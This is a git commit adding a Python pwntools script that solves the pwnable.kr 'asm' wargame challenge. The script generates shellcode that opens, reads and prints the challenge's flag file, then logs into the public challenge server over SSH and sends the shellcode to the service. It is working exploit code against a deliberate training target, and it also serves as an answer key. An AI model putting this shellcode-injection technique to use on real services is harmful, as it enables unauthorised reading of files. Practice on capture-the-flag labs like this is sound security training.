40a7575df0db6d179df9075b8dad3cd1f9fecb3a
Idan Retyk <idaniretyk@gmail.com>
2024-12-30 11:40:12 +0200

    solved asm

---
+++ CTFs/pwnable/asm.py
@@ -0,0 +1,24 @@
+from pwn import *
+
+# Ensure compatibility when running on macOS
+context(arch='amd64', os='linux')  # Target architecture and OS remain Linux
+
+file_name = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
+length = 50
+
+# Generate shellcode using pwntools
+shellcode = asm(
+    shellcraft.open(file_name) +
+    shellcraft.read('rax', 'rsp', length) +
+    shellcraft.write(1, 'rsp', length) +
+    shellcraft.exit(0)
+)
+
+# SSH into the target Linux machine
+sh = ssh('asm', 'pwnable.kr', password='guest', port=2222)  # SSH details
+p = sh.remote('0', 9026)  # Connect to the remote challenge service
+
+# Interact with the service
+print(p.recv())  # Receive the initial message
+p.sendline(shellcode)  # Send the generated shellcode
+print(p.recv())  # Receive and print the output (likely the flag)
